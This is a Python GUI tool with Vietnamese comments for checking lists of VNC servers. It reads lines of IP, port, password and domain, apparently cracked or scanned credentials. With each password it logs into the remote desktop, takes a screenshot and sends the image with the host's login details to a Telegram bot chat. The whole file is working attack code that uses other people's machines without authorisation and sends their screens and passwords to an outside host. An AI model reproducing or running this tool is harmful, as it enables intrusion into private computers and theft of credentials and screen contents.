import tkinter as tk
from tkinter import filedialog, messagebox
import socket
import requests
import threading
import vncdotool.api
import tempfile

# Biến toàn cục để kiểm soát trạng thái chạy của quá trình kiểm tra
stop_event = threading.Event()

# Hàm kiểm tra xem máy chủ VNC có khả dụng không
def check_vnc_server(ip, port):
    print(f"Đang kiểm tra máy chủ VNC tại {ip}:{port}")
    try:
        with socket.create_connection((ip, port), timeout=30):
            return True
    except (socket.timeout, ConnectionRefusedError, OSError) as e:
        print(f"Lỗi khi kết nối tới máy chủ VNC tại {ip}:{port}: {e}")
        return False

# Hàm gửi tin nhắn đến bot Telegram
def send_telegram_message(bot_token, chat_id, message):
    print(f"Đang gửi tin nhắn đến Telegram chat {chat_id}")
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    data = {
        "chat_id": chat_id,
        "text": message,
        "parse_mode": "HTML"
    }
    response = requests.post(url, data=data)
    print(f"Kết quả gửi tin nhắn: {response.status_code}")
    return response.status_code == 200

# Hàm gửi ảnh đến bot Telegram
def send_telegram_photo(bot_token, chat_id, photo_path, caption):
    print(f"Đang gửi ảnh đến Telegram chat {chat_id}")
    url = f"https://api.telegram.org/bot{bot_token}/sendPhoto"
    with open(photo_path, 'rb') as photo:
        data = {
            "chat_id": chat_id,
            "caption": caption,
            "parse_mode": "HTML"
        }
        files = {
            "photo": photo
        }
        response = requests.post(url, data=data, files=files)
    print(f"Kết quả gửi ảnh: {response.status_code}")
    return response.status_code == 200

# Hàm chụp ảnh màn hình từ máy chủ VNC
def take_vnc_screenshot(ip, port, password):
    print(f"Đang chụp ảnh màn hình của máy chủ VNC tại {ip}:{port}")
    screenshot_path = None
    try:
        with tempfile.NamedTemporaryFile(delete=False, suffix='.png') as tmp_file:
            client = vncdotool.api.connect(f'{ip}::{port}', password=password, timeout=5)
            client.captureScreen(tmp_file.name)
            client.disconnect()
            screenshot_path = tmp_file.name
            print(f"Đã chụp xong ảnh màn hình của máy chủ VNC tại {ip}:{port}")
    except Exception as e:
        print(f"Không thể chụp ảnh màn hình của máy chủ VNC {ip}:{port}: {e}")
    return screenshot_path

# Hàm tải danh sách máy chủ VNC từ tệp
def load_vnc_servers(file_path):
    print(f"Đang tải các máy chủ VNC từ {file_path}")
    servers = []
    try:
        with open(file_path, 'r') as file:
            for line in file:
                parts = line.strip().split('-')
                if len(parts) == 3:
                    ip_port, password, domain = parts
                    ip, port = ip_port.split(':')
                    servers.append({
                        "ip": ip,
                        "port": int(port),
                        "password": password,
                        "domain": domain
                    })
    except Exception as e:
        print(f"Không thể tải các máy chủ VNC từ {file_path}: {e}")
    return servers

# Hàm tạo tin nhắn định dạng
def create_formatted_message(ip, port, password, domain, type_status):
    message = (
        f"✳ <b>IP:</b> <code>{ip}</code>\n"
        f"🔒 <b>Port:</b> {port}\n"
        f"🔑 <b>Password:</b> {password}\n"
        f"🌐 <b>Domain:</b> {domain}\n"
        f"⚡ <b>Type:</b> {type_status}\n"
    )
    return message

# Hàm kiểm tra máy chủ, chụp ảnh màn hình và gửi kết quả đến Telegram
def check_servers_and_notify(file_path, bot_token, chat_id, max_workers):
    print("Bắt đầu kiểm tra các máy chủ và thông báo")
    servers = load_vnc_servers(file_path)
    for server in servers:
        if stop_event.is_set():
            break
        ip = server["ip"]
        port = server["port"]
        password = server["password"]
        domain = server["domain"]
        is_available = check_vnc_server(ip, port)
        type_status = "Real Server✅" if is_available else "Fake Server❌"
        
        if is_available:
            try:
                screenshot_path = take_vnc_screenshot(ip, port, password)
                if screenshot_path:
                    caption = create_formatted_message(ip, port, password, domain, type_status)
                    send_telegram_photo(bot_token, chat_id, screenshot_path, caption)
                else:
                    message = create_formatted_message(ip, port, password, domain, type_status)
                    send_telegram_message(bot_token, chat_id, message)
            except Exception as e:
                print(f"Lỗi khi xử lý máy chủ {ip}:{port}: {e}")
                continue
        else:
            message = create_formatted_message(ip, port, password, domain, type_status)
            send_telegram_message(bot_token, chat_id, message)

    messagebox.showinfo("Thông báo", "Đã hoàn thành kiểm tra các máy chủ và gửi thông báo.")

# Hàm bắt đầu kiểm tra VNC trong một luồng riêng
def start_checking():
    stop_event.clear()
    file_path = results_file_entry.get()
    bot_token = bot_token_entry.get()
    chat_id = chat_id_entry.get()
    max_workers = int(max_workers_entry.get())
    print(f"Bắt đầu kiểm tra với tệp: {file_path}, bot token: {bot_token}, chat ID: {chat_id}")
    threading.Thread(target=check_servers_and_notify, args=(file_path, bot_token, chat_id, max_workers)).start()

# Hàm dừng kiểm tra VNC
def stop_checking():
    print("Dừng quá trình kiểm tra")
    stop_event.set()

# Hàm duyệt tệp kết quả
def browse_file():
    file_path = filedialog.askopenfilename()
    results_file_entry.delete(0, tk.END)
    results_file_entry.insert(0, file_path)

# Tạo cửa sổ ứng dụng chính
app = tk.Tk()
app.title("VNC Checker và Bot Telegram")

# Nhập tệp kết quả
tk.Label(app, text="Tệp kết quả:").grid(row=0, column=0, sticky=tk.W)
results_file_entry = tk.Entry(app, width=50)
results_file_entry.grid(row=0, column=1, padx=5, pady=5)
browse_button = tk.Button(app, text="Duyệt", command=browse_file)
browse_button.grid(row=0, column=2, padx=5, pady=5)

# Nhập bot token
tk.Label(app, text="Bot Token:").grid(row=1, column=0, sticky=tk.W)
bot_token_entry = tk.Entry(app, width=50)
bot_token_entry.grid(row=1, column=1, padx=5, pady=5)

# Nhập chat ID
tk.Label(app, text="Chat ID:").grid(row=2, column=0, sticky=tk.W)
chat_id_entry = tk.Entry(app, width=50)
chat_id_entry.grid(row=2, column=1, padx=5, pady=5)

# Nhập số lượng công nhân tối đa
tk.Label(app, text="Số lượng công nhân tối đa:").grid(row=3, column=0, sticky=tk.W)
max_workers_entry = tk.Entry(app, width=50)
max_workers_entry.grid(row=3, column=1, padx=5, pady=5)
max_workers_entry.insert(0, "1000")

# Nút Bắt đầu và Dừng
start_button = tk.Button(app, text="Bắt đầu", command=start_checking)
start_button.grid(row=4, column=0, padx=5, pady=10)
stop_button = tk.Button(app, text="Dừng", command=stop_checking)
stop_button.grid(row=4, column=1, padx=5, pady=10)

# Chạy vòng lặp chính của ứng dụng
app.mainloop()

